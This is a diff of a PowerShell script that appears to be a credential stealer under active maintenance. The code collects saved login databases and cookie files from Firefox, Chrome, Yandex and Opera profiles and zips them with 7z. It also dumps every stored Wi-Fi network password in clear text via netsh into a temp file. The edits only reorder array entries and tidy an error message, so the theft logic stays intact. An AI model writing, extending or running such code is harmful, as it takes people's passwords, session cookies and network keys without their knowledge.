@@ -13,8 +13,8 @@ else{
 $lst = @{0=(($env:APPDATA+"\Mozilla\Firefox\Profiles\*"), "firefox", "logins.json","*.db");
         1=(($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\"), "chrome", "Login Data", "Cookies");
         2=(($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\"), "browser", "Ya Passman Data", "Cookies");
-        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Login Data", "Opera123", "Cookies");
-        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"),  "Opera5656", "Login Data", "Cookies")}
+        3=(($env:APPDATA+"\Opera Software\Opera Stable\"), "Opera123", "Login Data", "Cookies");
+        4=(($env:APPDATA+"\Opera Software\Opera GX Stable111111\"), "Opera5656", "Login Data", "Cookies")}
 
 for ($i=0; $i -lt 5; $i++){
   if(Test-Path -Path $lst[$i][0]){
@@ -28,7 +28,10 @@ for ($i=0; $i -lt 5; $i++){
       .\7z.exe a $p (Get-ChildItem -Path $lst[$i][0] -Include  $lst[$i][2], $lst[$i][3] -Recurse) -spf -tzip
     }
   }
-  else{echo $lst[$i][1];$e=$e+$lst[$i][1]}
+  else{
+    echo $lst[$i][1];
+    $e=$e+' '+$lst[$i][1]
+  }
 }
 
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Groups[1].Value.Trim();$_} | %{(netsh wlan show profile name="$n" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$p=$_.Matches.Groups[1].Value.Trim();$_} | %{[PSCustomObject]@{E=$n;P=$p}} | Format-Table -AutoSize > $env:TEMP\w.txt
